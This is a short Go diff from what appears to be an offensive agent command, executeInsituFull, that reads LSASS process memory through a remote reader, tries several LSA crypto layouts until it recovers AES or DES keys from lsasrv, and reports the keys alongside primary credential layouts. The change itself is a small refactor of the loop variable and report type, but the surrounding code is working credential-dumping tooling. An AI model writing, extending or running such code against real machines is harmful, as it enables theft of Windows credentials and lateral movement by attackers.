@@ -76,11 +76,13 @@ func executeInsituFull() structs.CommandResult {
 	_ = sigVariant
 
 	reader := lsassRemoteReader{h: h}
-	var cryptoReport insituFullCryptoReport
+	var cryptoReport *insituFullCryptoReport
 	var cryptoMaterial lsaCryptoMaterial
 	var cryptoErrStr string
-	for _, cryptoLayout := range lsaCryptoLayouts {
-		cryptoReport, cryptoMaterial, cryptoErrStr = captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+	var cryptoLayoutName string
+	for _, cl := range lsaCryptoLayouts {
+		cryptoReport, cryptoMaterial, cryptoErrStr = captureLsaCrypto(reader, lsasrvBytes, mod.Base, cl)
+		cryptoLayoutName = cl.Name
 		if cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey() {
 			break
 		}
@@ -190,7 +192,7 @@ func executeInsituFull() structs.CommandResult {
 		LsasrvSize:               mod.Size,
 		AnchorAddr:               fmt.Sprintf("0x%X", anchor),
 		StructLayout:             layout.Name,
-		CryptoLayout:             cryptoLayout.Name,
+		CryptoLayout:             cryptoLayoutName,
 		PrimaryCredentialLayout:  PrimaryCredential10NewLayout.Name,
 		LsaCrypto:                cryptoReport,
 		LsaCryptoErr:             cryptoErrStr,
